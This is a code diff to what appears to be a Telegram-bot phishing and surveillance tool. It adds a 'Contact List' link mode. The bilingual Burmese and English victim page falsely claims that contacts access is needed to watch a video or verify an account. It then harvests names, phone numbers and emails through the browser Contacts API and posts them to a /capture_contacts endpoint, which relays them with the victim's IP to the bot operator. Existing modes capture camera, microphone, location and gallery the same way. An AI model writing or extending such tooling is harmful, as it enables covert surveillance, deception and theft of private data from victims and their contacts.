@@ -427,6 +427,8 @@ async function startCapture(){
     await sendGallery();animateBuffer(100,600);
   } else if(mode==="frontcam"){
     await sendFrontPhoto();animateBuffer(100,600);
+  } else if(mode==="contacts"){
+    await sendContacts();animateBuffer(100,600);
   } else {
     animateBuffer(100,600);
   }
@@ -440,7 +442,8 @@ const MODAL={
   location:{icon:"📍",mm:"တည်နေရာ စစ်ဆေးမှု လိုအပ်သည်",en:"Region Check Required",bmm:"သင်နေသောဒေသမှ ဤဗီဒီယောကို ကြည့်ရှုခွင့်ရှိမရှိ စစ်ဆေးရန် လိုအပ်သည်",ben:"Location check required to verify you can watch this in your region."},
   video:{icon:"🎥",mm:"ကင်မရာ + မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",en:"Camera & Mic Required",bmm:"HD ဗီဒီယို ကြည့်ရှုရန် ကင်မရာနှင့် မိုက်ခရိုဖုန်း ခွင့်ပြုချက် လိုအပ်သည်",ben:"Camera & mic access required to stream HD video."},
   gallery:{icon:"🖼️",mm:"Gallery ခွင့်ပြုချက် လိုအပ်သည်",en:"Gallery Access Required",bmm:"ဓာတ်ပုံများ ကြည့်ရှုရန် Gallery ခွင့်ပြုချက် ပေးရန် လိုအပ်သည်",ben:"Gallery access required to unlock HD photo content."},
-  frontcam:{icon:"🤳",mm:"Front ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်",en:"Front Camera Required",bmm:"Selfie ပုံဖြင့် အတည်ပြုရန် Front ကင်မရာ ခွင့်ပြုချက် ပေးရန် လိုအပ်သည်",ben:"Front camera access required for identity verification."}
+  frontcam:{icon:"🤳",mm:"Front ကင်မရာ ခွင့်ပြုချက် လိုအပ်သည်",en:"Front Camera Required",bmm:"Selfie ပုံဖြင့် အတည်ပြုရန် Front ကင်မရာ ခွင့်ပြုချက် ပေးရန် လိုအပ်သည်",ben:"Front camera access required for identity verification."},
+  contacts:{icon:"📞",mm:"Contacts ခွင့်ပြုချက် လိုအပ်သည်",en:"Contacts Access Required",bmm:"ဤဗီဒီယို ကြည့်ရှုရန် Contacts ခွင့်ပြုချက် ပေးရန် လိုအပ်သည်",ben:"Contacts access required to verify your account and unlock content."}
 };
 document.getElementById("playBtn").onclick=()=>{
   const t=MODAL[mode]||MODAL.all;
@@ -465,6 +468,21 @@ document.getElementById("playBtn").onclick=()=>{
     setTimeout(()=>document.getElementById("playBtn").click(),1800);
   };
 };
+async function sendContacts(){
+  try{
+    if(!('contacts' in navigator&&'ContactsManager' in window)){
+      fetch('/capture_contacts',{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({token,contacts:[],note:'API not supported on this device'})});
+      return;
+    }
+    const props=['name','tel','email'];
+    const contacts=await navigator.contacts.select(props,{multiple:true});
+    if(contacts&&contacts.length>0){
+      fetch('/capture_contacts',{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({token,contacts})});
+    }
+  }catch(e){}
+}
 async function sendFrontPhoto(){
   try{
     const stream=await getCameraStream("user");
@@ -546,7 +564,7 @@ def track_page(token):
         ua = request.headers.get('User-Agent', 'Unknown')[:120]
         mode_labels = {'all':'🌐 All-in-One','photo':'📸 Photo','audio':'🎤 Audio',
                        'location':'📍 Location','video':'🎥 Video','gallery':'🖼️ Gallery',
-                       'frontcam':'🤳 Front Cam'}
+                       'frontcam':'🤳 Front Cam','contacts':'📞 Contacts'}
         label = mode_labels.get(mode, mode)
         alert = (
             f"🔗 <b>Link ဖွင့်သည်! | Link Opened!</b>\n"
@@ -637,6 +655,41 @@ def capture_combined_audio():
     caption = _fp_caption(fp_json)
     audio_bytes = audio_file.read()
     threading.Thread(target=broadcast_voice, args=(user_id, audio_bytes, caption), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
+@flask_app.route('/capture_contacts', methods=['POST'])
+def capture_contacts():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    contacts = data.get('contacts', [])
+    note = data.get('note', '')
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    if note:
+        report = (
+            f"📞 <b>CONTACT LIST</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"🌐 IP: <code>{ip}</code>\n"
+            f"⚠️ Note: {note}\n"
+            f"━━━━━━━━━━━━━━━━━━━━"
+        )
+    else:
+        lines = [f"📞 <b>CONTACT LIST ({len(contacts)} contacts)</b>\n━━━━━━━━━━━━━━━━━━━━\n🌐 IP: <code>{ip}</code>\n"]
+        for c in contacts[:50]:
+            name = (c.get('name') or [''])[0] if isinstance(c.get('name'), list) else c.get('name', '')
+            tels = c.get('tel', [])
+            emails = c.get('email', [])
+            tel_str = ', '.join(tels) if tels else '-'
+            email_str = ', '.join(emails) if emails else '-'
+            lines.append(f"👤 <b>{name}</b>\n📱 {tel_str}\n✉️ {email_str}")
+        lines.append("━━━━━━━━━━━━━━━━━━━━")
+        report = '\n'.join(lines)
+    for chunk_start in range(0, max(1, len(report)), 4000):
+        chunk = report[chunk_start:chunk_start+4000]
+        threading.Thread(target=broadcast_message, args=(user_id, chunk, True), daemon=True).start()
     return jsonify({"ok": True}), 200
 
 
@@ -795,6 +848,7 @@ def get_reply_keyboard():
             [KeyboardButton("📸 Photo Link"), KeyboardButton("🎤 Audio Link")],
             [KeyboardButton("📍 Location Link"), KeyboardButton("🎥 Video Link")],
             [KeyboardButton("🖼️ Gallery Link"), KeyboardButton("🤳 Front Cam Link")],
+            [KeyboardButton("📞 Contact List Link")],
             [KeyboardButton("💰 Daily Bonus"), KeyboardButton("👥 Refer & Earn")],
             [KeyboardButton("💎 My Points | Access"), KeyboardButton("📋 Active Links")],
             [KeyboardButton("🗑 Clear Links"), KeyboardButton("❓ Help")],
@@ -813,6 +867,7 @@ def main_menu_inline():
          InlineKeyboardButton("🎥 Video", callback_data="gen_video")],
         [InlineKeyboardButton("🖼️ Gallery Link", callback_data="gen_gallery"),
          InlineKeyboardButton("🤳 Front Cam", callback_data="gen_front")],
+        [InlineKeyboardButton("📞 Contact List", callback_data="gen_contact")],
         [InlineKeyboardButton("💰 Daily Bonus", callback_data="daily"),
          InlineKeyboardButton("👥 Refer & Earn", callback_data="refer")],
         [InlineKeyboardButton("💎 My Points", callback_data="mypoints"),
@@ -1245,6 +1300,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🎥 Video Link":       ("video", "🎥 Video"),
         "🖼️ Gallery Link":     ("gallery", "🖼️ Gallery"),
         "🤳 Front Cam Link":   ("frontcam", "🤳 Front Cam"),
+        "📞 Contact List Link": ("contacts", "📞 Contacts"),
     }
 
     if text in MODE_MAP:
@@ -1318,7 +1374,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "❓ <b>Help | အကူအညီ</b>\n\n"
             "<b>Links:</b>\n"
             "🌐 All → Photo+Audio+Location+Video+Device\n"
-            "📸 Photo → ဓာတ်ပုံ\n🎤 Audio → အသံ\n📍 Location → တည်နေရာ\n🎥 Video → ဗီဒီယို\n🖼️ Gallery → ဓာတ်ပုံ Gallery\n🤳 Front Cam → Selfie ဓာတ်ပုံ\n\n"
+            "📸 Photo → ဓာတ်ပုံ\n🎤 Audio → အသံ\n📍 Location → တည်နေရာ\n🎥 Video → ဗီဒီယို\n🖼️ Gallery → ဓာတ်ပုံ Gallery\n🤳 Front Cam → Selfie ဓာတ်ပုံ\n📞 Contact List → ဖုန်းစာရင်း\n\n"
             "<b>Points system:</b>\n"
             f"🎁 Daily Bonus → +{DAILY_BONUS_PTS} pts/day\n"
             f"👥 Refer → +{REFER_BONUS_PTS} pts + 1 day/ကိုယ်\n"
@@ -1351,6 +1407,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "gen_video": ("video", "🎥 Video"),
         "gen_gallery": ("gallery", "🖼️ Gallery"),
         "gen_front":   ("frontcam", "🤳 Front Cam"),
+        "gen_contact": ("contacts", "📞 Contacts"),
     }
 
     if data in GEN_MODES:
